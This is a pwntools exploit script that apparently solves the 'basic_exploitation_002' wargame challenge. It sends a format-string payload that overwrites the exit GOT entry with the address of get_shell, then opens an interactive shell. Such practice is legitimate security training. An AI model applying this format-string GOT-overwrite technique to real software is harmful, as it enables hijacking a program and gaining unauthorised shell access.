from pwn import *

p = process('./basic_exploitation_002')
e = ELF('./basic_exploitation_002')

shell_add = e.symbols['get_shell']
exit_got = e.got['exit']

shell_add_low = shell_add & 0xffff
shell_add_high = shell_add >> 16

payload = b''
payload += p32(exit_got)
payload += p32(exit_got+2)
payload += '%{}c'.format((shell_add_low - 8) % 0x10000).encode()
payload += b'%1$hn'
payload += '%{}c'.format((shell_add_high - shell_add_low) % 0x10000).encode()
payload += b'%2$hn'

p.send(payload)
p.interactive()


